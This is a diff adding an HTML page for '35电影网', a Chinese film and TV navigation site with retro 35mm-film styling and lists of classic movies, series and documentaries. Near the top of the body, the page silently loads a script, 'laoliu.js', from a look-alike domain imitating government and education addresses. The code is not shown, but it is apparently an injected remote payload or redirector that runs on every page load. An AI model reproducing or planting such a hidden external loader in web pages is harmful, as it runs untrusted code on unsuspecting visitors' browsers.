@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>35电影网 - 35mm胶片质感影视导航 | 35dianyingwang-h5.github.io</title>
+<meta name="description" content="35电影网（https://35dianyingwang-h5.github.io）以35mm胶片质感打造的影视导航站，电影、电视剧、纪录片全品类，复古暗房美学，移动端自适应。">
+<meta name="keywords" content="35电影网,35mm胶片,经典电影,老电影,复古影视,胶片质感,暗房美学">
+<meta name="author" content="35电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --reel:#1a1208;
+  --reel-2:#241808;
+  --amber:#e8853a;
+  --amber-light:#f0a060;
+  --cream:#f5e6d0;
+  --silver:#8a7a6a;
+  --hole:#0d0905;
+  --sans:'Georgia','Songti SC',serif;
+  --mono:'Courier New',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--reel);color:var(--cream);
+  font-family:var(--sans);line-height:1.8;font-size:15px;
+  background-image:
+    repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,.008) 3px,rgba(255,255,255,.008) 6px);
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 胶片齿孔边框 - 全局装饰 */
+.filmstrip-top,.filmstrip-bottom{
+  height:26px;
+  background:
+    radial-gradient(circle at 13px 13px,var(--hole) 5px,transparent 5.5px) repeat-x,
+    var(--reel-2);
+  background-size:26px 26px;
+  border-top:2px solid var(--amber);
+}
+.filmstrip-bottom{border-top:0;border-bottom:2px solid var(--amber)}
+
+/* 帧计数器 */
+.frame-counter{
+  position:fixed;top:50%;right:8px;transform:translateY(-50%);
+  z-index:200;font-family:var(--mono);font-size:10px;
+  color:var(--silver);writing-mode:vertical-rl;
+  letter-spacing:3px;pointer-events:none;
+}
+
+/* 导航 */
+header{
+  background:rgba(26,18,8,.94);
+  border-bottom:1px solid var(--amber);
+  position:sticky;top:0;z-index:100;
+  backdrop-filter:blur(6px);
+}
+.header-in{
+  max-width:1100px;margin:0 auto;
+  display:flex;justify-content:space-between;align-items:center;
+  padding:14px 20px;
+}
+.logo{
+  font-family:var(--mono);font-size:22px;font-weight:900;
+  letter-spacing:2px;color:var(--amber);
+}
+.logo span{color:var(--cream)}
+.nav-toggle{display:none;font-size:22px;cursor:pointer;color:var(--amber)}
+nav ul{display:flex;gap:24px;list-style:none}
+nav a{font-size:13px;letter-spacing:1px;color:var(--silver);transition:.3s}
+nav a:hover{color:var(--amber)}
+
+/* 主容器 */
+main{max-width:1100px;margin:0 auto;padding:0 20px}
+
+/* 通用 */
+section{padding:64px 0;border-bottom:1px dashed var(--silver)}
+
+/* 胶片帧容器 */
+.reel-frame{
+  border-left:8px solid var(--reel-2);
+  border-right:8px solid var(--reel-2);
+  padding:0 24px;
+  position:relative;
+}
+.reel-frame::before,.reel-frame::after{
+  content:"";position:absolute;top:0;bottom:0;width:6px;
+  background:radial-gradient(circle,var(--hole) 2px,transparent 2.5px) repeat-y;
+  background-size:6px 12px;
+}
+.reel-frame::before{left:-8px}
+.reel-frame::after{right:-8px}
+
+.frame-no{
+  font-family:var(--mono);font-size:11px;color:var(--amber);
+  letter-spacing:3px;margin-bottom:6px;
+}
+.section-title{
+  font-size:clamp(1.8rem,4vw,2.8rem);font-weight:900;
+  color:var(--cream);margin-bottom:8px;
+}
+.section-desc{color:var(--silver);font-size:14px;margin-bottom:32px;max-width:620px}
+
+/* 栏目1：首页 - 左右滑片 */
+#hero{
+  min-height:82vh;display:flex;align-items:center;
+  position:relative;
+}
+.hero-slide{
+  display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;
+  width:100%;
+}
+.hero-left{
+  border-right:1px solid var(--amber);
+  padding-right:40px;
+}
+.hero-left .reel-label{
+  display:inline-block;font-family:var(--mono);font-size:11px;
+  color:var(--reel);background:var(--amber);
+  padding:3px 10px;letter-spacing:2px;margin-bottom:16px;
+}
+.hero-title{
+  font-size:clamp(2.4rem,6vw,4.2rem);line-height:.95;
+  font-weight:900;margin-bottom:16px;
+}
+.hero-title em{color:var(--amber);font-style:normal}
+.hero-sub{color:var(--silver);font-size:16px;margin-bottom:24px}
+.hero-url{
+  display:inline-block;font-family:var(--mono);font-size:13px;
+  color:var(--amber);border:1px solid var(--amber);
+  padding:10px 20px;transition:.3s;
+}
+.hero-url:hover{background:var(--amber);color:var(--reel)}
+.hero-right{
+  text-align:center;
+  position:relative;
+}
+.negative{
+  background:var(--cream);color:var(--reel);
+  padding:30px 20px;border-radius:4px;
+  transform:rotate(2deg);
+  box-shadow:0 20px 50px rgba(0,0,0,.5);
+}
+.negative .neg-title{
+  font-family:var(--mono);font-size:13px;letter-spacing:3px;
+  margin-bottom:12px;
+}
+.negative .neg-num{
+  font-size:48px;font-weight:900;line-height:1;color:var(--reel);
+}
+.negative .neg-sub{
+  font-size:12px;color:var(--silver);margin-top:8px;
+}
+.positive{
+  margin-top:20px;
+  background:var(--reel-2);border:1px solid var(--amber);
+  padding:24px 20px;border-radius:4px;
+  transform:rotate(-1.5deg);
+}
+.dev-label{
+  font-family:var(--mono);font-size:11px;color:var(--amber);
+  letter-spacing:2px;margin-bottom:10px;
+}
+.dev-bar{
+  height:6px;background:var(--reel);border-radius:3px;overflow:hidden;
+  margin:8px 0;
+}
+.dev-bar i{display:block;height:100%;background:var(--amber);width:78%}
+
+/* 栏目2：经典片库 - 胶片帧网格 */
+#classics{padding:64px 0}
+.classic-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px;
+}
+.classic-card{
+  background:var(--reel-2);border:1px solid var(--silver);
+  padding:0;overflow:hidden;transition:.3s;
+}
+.classic-card:hover{
+  border-color:var(--amber);
+  transform:translateY(-4px);
+  box-shadow:0 12px 30px rgba(232,133,58,.15);
+}
+.celluloid{
+  height:200px;background:linear-gradient(135deg,var(--reel),#2a1a0a);
+  display:flex;flex-direction:column;justify-content:space-between;
+  padding:10px;
+  position:relative;
+}
+.celluloid::before{
+  content:"";position:absolute;left:0;right:0;top:0;height:8px;
+  background:radial-gradient(circle at 8px 4px,var(--hole) 3px,transparent 3.5px) repeat-x;
+  background-size:16px 8px;
+}
+.celluloid::after{
+  content:"";position:absolute;left:0;right:0;bottom:0;height:8px;
+  background:radial-gradient(circle at 8px 4px,var(--hole) 3px,transparent 3.5px) repeat-x;
+  background-size:16px 8px;
+}
+.cel-no{
+  font-family:var(--mono);font-size:10px;color:var(--amber);
+  margin-top:8px;
+}
+.cel-year{
+  font-family:var(--mono);font-size:11px;color:var(--silver);
+}
+.classic-body{padding:14px}
+.classic-body h4{font-size:15px;color:var(--cream);margin-bottom:4px}
+.classic-body p{font-size:12px;color:var(--silver)}
+
+/* 栏目3：电视剧 - 左右分栏列表 */
+#tv{padding:64px 0}
+.tv-split{
+  display:grid;grid-template-columns:1fr 1fr;gap:24px;
+}
+.tv-col h4{
+  font-family:var(--mono);font-size:12px;letter-spacing:2px;
+  color:var(--amber);margin-bottom:14px;
+  border-bottom:1px solid var(--amber);padding-bottom:6px;
+}
+.tv-row{
+  display:flex;gap:12px;align-items:center;
+  padding:12px 0;border-bottom:1px dotted var(--silver);
+}
+.tv-frame{
+  width:48px;height:48px;flex-shrink:0;
+  background:var(--reel-2);border:1px solid var(--silver);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:12px;color:var(--amber);
+}
+.tv-row h5{font-size:14px;color:var(--cream)}
+.tv-row p{font-size:11px;color:var(--silver)}
+
+/* 栏目4：纪录片 - 显影进度 */
+#docs{padding:64px 0}
+.doc-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px;
+}
+.doc-card{
+  background:var(--reel-2);border:1px solid var(--silver);
+  padding:18px;transition:.3s;
+}
+.doc-card:hover{border-color:var(--amber)}
+.doc-card h4{font-size:16px;color:var(--cream);margin-bottom:6px}
+.doc-card p{font-size:13px;color:var(--silver);margin-bottom:12px}
+.dev-info{
+  display:flex;justify-content:space-between;
+  font-family:var(--mono);font-size:10px;color:var(--amber);
+  margin-bottom:4px;
+}
+.dev-track{
+  height:5px;background:var(--reel);border-radius:3px;overflow:hidden;
+}
+.dev-track i{display:block;height:100%;background:var(--amber)}
+
+/* 栏目5：关于 */
+#about{padding:64px 0}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.about-text p{color:var(--silver);margin-bottom:14px}
+.contact-card{
+  background:var(--reel-2);border:1px solid var(--amber);
+  padding:24px;border-radius:4px;
+}
+.contact-card .dev-label{margin-bottom:16px}
+.contact-row{
+  display:flex;justify-content:space-between;
+  padding:8px 0;border-bottom:1px dotted var(--silver);
+  font-size:13px;
+}
+.contact-row .label{color:var(--silver)}
+.contact-row .val{color:var(--amber);font-family:var(--mono)}
+
+/* 页脚 */
+footer{
+  background:var(--reel-2);color:var(--silver);
+  text-align:center;padding:30px 20px;
+  border-top:1px solid var(--amber);
+}
+footer h4{font-family:var(--mono);font-size:16px;color:var(--amber);margin-bottom:8px}
+footer p{font-size:12px}
+footer a{color:var(--amber)}
+.foot-links{margin-top:16px;display:flex;justify-content:center;gap:20px;flex-wrap:wrap}
+.foot-links a{font-size:12px;color:var(--silver)}
+.foot-links a:hover{color:var(--amber)}
+
+/* 移动端 */
+@media(max-width:768px){
+  .nav-toggle{display:block}
+  nav ul{
+    position:absolute;top:100%;left:0;right:0;
+    flex-direction:column;gap:0;background:var(--reel);
+    border-bottom:1px solid var(--amber);
+    max-height:0;overflow:hidden;transition:.3s;
+  }
+  nav ul.open{max-height:320px}
+  nav ul li{border-top:1px solid var(--silver)}
+  nav ul li a{display:block;padding:14px 20px}
+  .hero-slide{grid-template-columns:1fr}
+  .hero-left{border-right:0;padding-right:0;border-bottom:1px solid var(--amber);padding-bottom:30px}
+  .negative,.positive{display:none}
+  .tv-split{grid-template-columns:1fr}
+  .about-grid{grid-template-columns:1fr}
+  .frame-counter{display:none}
+  .reel-frame{padding:0 12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="filmstrip-top"></div>
+<div class="frame-counter">FRAME 0001 / 0035</div>
+
+<header>
+  <div class="header-in">
+    <div class="logo">35<span>电影网</span></div>
+    <div class="nav-toggle" onclick="document.getElementById('nav').classList.toggle('open')">☰</div>
+    <nav>
+      <ul id="nav">
+        <li><a href="#hero">放映室</a></li>
+        <li><a href="#classics">经典片库</a></li>
+        <li><a href="#tv">电视剧集</a></li>
+        <li><a href="#docs">纪录片</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+<!-- 栏目1：首页 -->
+<section id="hero">
+  <div class="reel-frame">
+    <div class="frame-no">FRAME 01 — OPENING</div>
+    <div class="hero-slide">
+      <div class="hero-left">
+        <span class="reel-label">35mm REEL</span>
+        <h1 class="hero-title">35<em>电影</em>网</h1>
+        <p class="hero-sub">以35mm胶片质感，重新打捞那些值得反复放映的经典。电影、电视剧、纪录片，每一帧都是显影后的温度。</p>
+        <a href="#" class="hero-url">🌐 35dianyingwang-h5.github.io</a>
+      </div>
+      <div class="hero-right">
+        <div class="negative">
+          <div class="neg-title">— NEGATIVE —</div>
+          <div class="neg-num">35</div>
+          <div class="neg-sub">mm / 经典放映</div>
+        </div>
+        <div class="positive">
+          <div class="dev-label">DEVELOPING…</div>
+          <div class="dev-bar"><i></i></div>
+          <div style="font-size:12px;color:var(--amber);font-family:var(--mono)">显影进度 78% — 正在冲洗经典</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：经典片库 -->
+<section id="classics">
+  <div class="reel-frame">
+    <div class="frame-no">FRAME 02 — CLASSICS</div>
+    <h2 class="section-title">经典片库</h2>
+    <p class="section-desc">35mm胶片时代的杰作，每一部都经得起大银幕的检验</p>
+    <div class="classic-grid">
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.001</div>
+          <div class="cel-year">1972</div>
+        </div>
+        <div class="classic-body">
+          <h4>《教父》</h4>
+          <p>科波拉 · 黑帮史诗 · 4K修复版</p>
+        </div>
+      </article>
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.002</div>
+          <div class="cel-year">1994</div>
+        </div>
+        <div class="classic-body">
+          <h4>《肖申克的救赎》</h4>
+          <p>弗兰克·德拉邦特 · 剧情 · 影史Top1</p>
+        </div>
+      </article>
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.003</div>
+          <div class="cel-year">1954</div>
+        </div>
+        <div class="classic-body">
+          <h4>《七武士》</h4>
+          <p>黑泽明 · 日本武士片巅峰</p>
+        </div>
+      </article>
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.004</div>
+          <div class="cel-year">1998</div>
+        </div>
+        <div class="classic-body">
+          <h4>《海上钢琴师》</h4>
+          <p>朱塞佩·托纳多雷 · 音乐剧情</p>
+        </div>
+      </article>
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.005</div>
+          <div class="cel-year">2000</div>
+        </div>
+        <div class="classic-body">
+          <h4>《花样年华》</h4>
+          <p>王家卫 · 怀旧爱情 · 杜可风摄影</p>
+        </div>
+      </article>
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.006</div>
+          <div class="cel-year">1989</div>
+        </div>
+        <div class="classic-body">
+          <h4>《悲情城市》</h4>
+          <p>侯孝贤 · 台湾新电影代表</p>
+        </div>
+      </article>
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.007</div>
+          <div class="cel-year">1979</div>
+        </div>
+        <div class="classic-body">
+          <h4>《现代启示录》</h4>
+          <p>科波拉 · 越战史诗 · 复古战争片</p>
+        </div>
+      </article>
+      <article class="classic-card">
+        <div class="celluloid">
+          <div class="cel-no">F.008</div>
+          <div class="cel-year">1997</div>
+        </div>
+        <div class="classic-body">
+          <h4>《美丽人生》</h4>
+          <p>罗伯托·贝尼尼 · 二战剧情 · 奥斯卡</p>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：电视剧集 -->
+<section id="tv">
+  <div class="reel-frame">
+    <div class="frame-no">FRAME 03 — TV SERIES</div>
+    <h2 class="section-title">电视剧集</h2>
+    <p class="section-desc">经典剧集放映室，分左右两卷胶片</p>
+    <div class="tv-split">
+      <div class="tv-col">
+        <h4>— REEL A · 海外剧 —</h4>
+        <div class="tv-row">
+          <div class="tv-frame">A01</div>
+          <div><h5>《绝命毒师》</h5><p>AMC · 5季 · 犯罪剧情</p></div>
+        </div>
+        <div class="tv-row">
+          <div class="tv-frame">A02</div>
+          <div><h5>《切尔诺贝利》</h5><p>HBO · 5集 · 历史灾难</p></div>
+        </div>
+        <div class="tv-row">
+          <div class="tv-frame">A03</div>
+          <div><h5>《继承之战》</h5><p>HBO · 4季 · 家族商战</p></div>
+        </div>
+        <div class="tv-row">
+          <div class="tv-frame">A04</div>
+          <div><h5>《神探夏洛克》</h5><p>BBC · 4季 · 悬疑推理</p></div>
+        </div>
+      </div>
+      <div class="tv-col">
+        <h4>— REEL B · 华语剧 —</h4>
+        <div class="tv-row">
+          <div class="tv-frame">B01</div>
+          <div><h5>《大明王朝1566》</h5><p>国产 · 历史正剧 · 豆瓣9.8</p></div>
+        </div>
+        <div class="tv-row">
+          <div class="tv-frame">B02</div>
+          <div><h5>《父母爱情》</h5><p>国产 · 年代情感 · 经典重映</p></div>
+        </div>
+        <div class="tv-row">
+          <div class="tv-frame">B03</div>
+          <div><h5>《琅琊榜》</h5><p>国产 · 古装权谋 · 4K修复</p></div>
+        </div>
+        <div class="tv-row">
+          <div class="tv-frame">B04</div>
+          <div><h5>《康熙王朝》</h5><p>国产 · 历史剧 · 经典老剧</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：纪录片 -->
+<section id="docs">
+  <div class="reel-frame">
+    <div class="frame-no">FRAME 04 — DOCUMENTARY</div>
+    <h2 class="section-title">纪录片放映</h2>
+    <p class="section-desc">真实比虚构更震撼——正在显影的纪录长片</p>
+    <div class="doc-grid">
+      <div class="doc-card">
+        <h4>《地球脉动》</h4>
+        <p>BBC自然纪录片，4K航拍展现地球极致之美。</p>
+        <div class="dev-info"><span>PROCESSING</span><span>92%</span></div>
+        <div class="dev-track"><i style="width:92%;background:var(--amber)"></i></div>
+      </div>
+      <div class="doc-card">
+        <h4>《人生七年》</h4>
+        <p>英国纪录片，跟踪14个孩子从7岁到63岁的人生轨迹。</p>
+        <div class="dev-info"><span>PROCESSING</span><span>85%</span></div>
+        <div class="dev-track"><i style="width:85%"></i></div>
+      </div>
+      <div class="doc-card">
+        <h4>《我在故宫修文物》</h4>
+        <p>国产纪录片，展现文物修复师的匠人精神。</p>
+        <div class="dev-info"><span>PROCESSING</span><span>76%</span></div>
+        <div class="dev-track"><i style="width:76%"></i></div>
+      </div>
+      <div class="doc-card">
+        <h4>《迁徙的鸟》</h4>
+        <p>雅克·贝汉执导，用镜头追随候鸟跨越全球的旅程。</p>
+        <div class="dev-info"><span>PROCESSING</span><span>68%</span></div>
+        <div class="dev-track"><i style="width:68%"></i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：关于 -->
+<section id="about">
+  <div class="reel-frame">
+    <div class="frame-no">FRAME 05 — CREDITS</div>
+    <div class="about-grid">
+      <div class="about-text">
+        <h2 class="section-title">关于 35电影网</h2>
+        <p>35电影网（https://35dianyingwang-h5.github.io）是一个以35mm胶片质感为主题的影视导航站。我们相信，好电影值得被"冲洗"出来反复观看。</p>
+        <p>本站覆盖电影、电视剧、纪录片三大板块，采用复古暗房美学设计，致敬胶片电影时代。</p>
+        <p>本站为单页静态演示，内链以 # 占位，不生成 robots.txt / sitemap.xml。</p>
+      </div>
+      <div class="contact-card">
+        <div class="dev-label">— CONTACT SHEET —</div>
+        <div class="contact-row"><span class="label">网站名称</span><span class="val">35电影网</span></div>
+        <div class="contact-row"><span class="label">官网地址</span><span class="val">35dianyingwang-h5.github.io</span></div>
+        <div class="contact-row"><span class="label">影片类型</span><span class="val">电影/电视剧/纪录片</span></div>
+        <div class="contact-row"><span class="label">建站风格</span><span class="val">35mm胶片显影风</span></div>
+        <div class="contact-row"><span class="label">适配端</span><span class="val">PC / 移动端</span></div>
+        <div class="contact-row"><span class="label">内链方式</span><span class="val"># 占位</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <h4>35电影网 / 35MM REEL</h4>
+  <p>经典影视导航 · 胶片质感 · 致敬电影时代</p>
+  <p>官网：<a href="https://35dianyingwang-h5.github.io">35dianyingwang-h5.github.io</a></p>
+  <p style="margin-top:10px;font-size:11px">单页演示 · 内链 # 占位 · 无 robots.txt / sitemap.xml</p>
+  <div class="foot-links">
+    <a href="#">放映室 #</a>
+    <a href="#">片库 #</a>
+    <a href="#">剧集 #</a>
+    <a href="#">纪录片 #</a>
+    <a href="#">关于 #</a>
+  </div>
+</footer>
+
+<div class="filmstrip-bottom"></div>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    if(window.innerWidth<=768) document.getElementById('nav').classList.remove('open');
+  });
+});
+</script>
+</body>
+</html>
